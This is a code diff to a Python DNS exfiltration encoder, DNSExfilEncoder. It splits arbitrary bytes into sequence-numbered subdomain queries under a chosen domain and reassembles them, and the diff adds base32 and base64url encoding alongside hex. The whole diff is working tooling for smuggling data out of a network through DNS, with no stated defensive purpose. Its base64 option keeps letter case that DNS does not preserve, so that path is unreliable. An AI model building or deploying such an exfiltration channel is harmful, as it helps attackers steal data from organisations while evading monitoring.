@@ -2,15 +2,16 @@
 # Converts arbitrary bytes into a sequence of DNS subdomain queries.
 #
 # Encoding pipeline:
-#   input bytes -> hex string -> chunked labels -> FQDNs
+#   input bytes -> encoded string -> chunked labels -> FQDNs
 #
 # Each FQDN follows the pattern: {seq:02d}_{chunk}.{target_domain}
 # A termination FQDN signals end of stream: done.{target_domain}
 
 from __future__ import annotations
 
+import base64
 import logging
-from dataclasses import dataclass
+from dataclasses import dataclass, field
 
 logger = logging.getLogger(__name__)
 
@@ -23,12 +24,16 @@ _SEQ_PREFIX_LEN = 3
 # Hard cap on chunk_size to ensure sequence prefix + chunk <= 63.
 _MAX_CHUNK_SIZE = _DNS_LABEL_MAX - _SEQ_PREFIX_LEN  # 60
 
+# Encoding schemes accepted by DNSExfilEncoder.
+SUPPORTED_ENCODINGS = ("hex", "base32", "base64")
+
 
 @dataclass
 class EncodeResult:
     fqdns: list[str]
     chunk_count: int
     encoded_bytes: int
+    encoding: str = "hex"
 
 
 class DNSExfilEncoder:
@@ -36,13 +41,16 @@ class DNSExfilEncoder:
 
     Args:
         target_domain: The domain suffix appended to every query label.
-        chunk_size: Number of hex characters per subdomain label. Must be <= 60.
+        chunk_size: Characters per subdomain chunk. Must be <= 60.
+        encoding: Encoding scheme to apply to the raw bytes before chunking.
+            One of ``"hex"``, ``"base32"``, or ``"base64"``. Default ``"hex"``.
 
     Raises:
-        ValueError: If chunk_size exceeds the maximum safe value.
+        ValueError: If chunk_size exceeds the maximum safe value or encoding
+            is not a supported scheme.
     """
 
-    def __init__(self, target_domain: str, chunk_size: int = 30) -> None:
+    def __init__(self, target_domain: str, chunk_size: int = 30, encoding: str = "hex") -> None:
         if chunk_size > _MAX_CHUNK_SIZE:
             raise ValueError(
                 f"chunk_size {chunk_size} exceeds maximum {_MAX_CHUNK_SIZE}. "
@@ -51,8 +59,34 @@ class DNSExfilEncoder:
             )
         if chunk_size < 1:
             raise ValueError("chunk_size must be at least 1.")
+        if encoding not in SUPPORTED_ENCODINGS:
+            raise ValueError(f"encoding must be one of {SUPPORTED_ENCODINGS}, got '{encoding}'")
         self.target_domain = target_domain.strip(".")
         self.chunk_size = chunk_size
+        self.encoding = encoding
+
+    def _encode_bytes(self, data: bytes) -> str:
+        # hex: lowercase hex string
+        if self.encoding == "hex":
+            return data.hex()
+        # base32: lowercase, padding stripped — alphabet a-z2-7
+        if self.encoding == "base32":
+            return base64.b32encode(data).decode().rstrip("=").lower()
+        # base64url: padding stripped — alphabet A-Za-z0-9-_ (case preserved; base64 is case-sensitive)
+        return base64.urlsafe_b64encode(data).decode().rstrip("=")
+
+    def _decode_string(self, encoded: str) -> bytes:
+        # hex: direct fromhex
+        if self.encoding == "hex":
+            return bytes.fromhex(encoded)
+        # base32: uppercase + restore padding to nearest multiple of 8
+        if self.encoding == "base32":
+            upper = encoded.upper()
+            pad = (8 - len(upper) % 8) % 8
+            return base64.b32decode(upper + "=" * pad)
+        # base64url: restore padding to nearest multiple of 4
+        pad = (4 - len(encoded) % 4) % 4
+        return base64.urlsafe_b64decode(encoded + "=" * pad)
 
     def encode(self, data: bytes) -> EncodeResult:
         """Encode bytes into a list of FQDNs to query, in transmission order.
@@ -65,12 +99,12 @@ class DNSExfilEncoder:
         """
         if not data:
             logger.debug("encode called with empty data — returning empty result")
-            return EncodeResult(fqdns=[], chunk_count=0, encoded_bytes=0)
+            return EncodeResult(fqdns=[], chunk_count=0, encoded_bytes=0, encoding=self.encoding)
 
-        hex_str = data.hex()
+        encoded_str = self._encode_bytes(data)
         chunks = [
-            hex_str[i : i + self.chunk_size]
-            for i in range(0, len(hex_str), self.chunk_size)
+            encoded_str[i : i + self.chunk_size]
+            for i in range(0, len(encoded_str), self.chunk_size)
         ]
 
         fqdns = [
@@ -85,12 +119,13 @@ class DNSExfilEncoder:
             len(chunks),
             len(fqdns),
         )
-        return EncodeResult(fqdns=fqdns, chunk_count=len(chunks), encoded_bytes=len(data))
+        return EncodeResult(fqdns=fqdns, chunk_count=len(chunks), encoded_bytes=len(data), encoding=self.encoding)
 
     def decode(self, fqdns: list[str]) -> bytes:
         """Reconstruct original bytes from an ordered list of FQDNs.
 
-        Strips the termination FQDN and sequence prefixes, then hex-decodes.
+        Strips the termination FQDN and sequence prefixes, then decodes using
+        the scheme set on this encoder instance.
 
         Args:
             fqdns: List of FQDNs as produced by encode(), in order.
@@ -109,7 +144,7 @@ class DNSExfilEncoder:
             f for f in fqdns if not f.startswith(f"done.{self.target_domain}")
         ]
 
-        hex_parts: list[str] = []
+        parts: list[str] = []
         for fqdn in data_fqdns:
             # Extract label: everything before the first "."
             label = fqdn.split(".")[0]
@@ -118,8 +153,8 @@ class DNSExfilEncoder:
                 raise ValueError(
                     f"FQDN label '{label}' missing expected sequence prefix (e.g. '00_')."
                 )
-            hex_chunk = label.split("_", 1)[1]
-            hex_parts.append(hex_chunk)
+            chunk = label.split("_", 1)[1]
+            parts.append(chunk)
 
-        full_hex = "".join(hex_parts)
-        return bytes.fromhex(full_hex)
+        full_encoded = "".join(parts)
+        return self._decode_string(full_encoded)
